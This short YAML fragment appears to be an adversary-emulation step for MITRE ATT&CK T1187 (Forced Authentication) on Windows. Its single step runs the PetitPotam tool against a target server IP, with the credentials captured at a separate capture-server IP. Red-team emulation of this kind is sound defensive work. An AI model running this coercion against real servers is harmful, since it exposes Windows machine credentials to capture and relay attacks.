        - 'T1187: Forced Authentication'
requirements:
    platforms:
        - os: windows
steps:
    - name: petitpotam
      inline: |
        & "{{.Args.petitpotam_path}}" {{.Args.captureServerIP}} {{.Args.targetServerIP}} {{.Args.efsApi}}
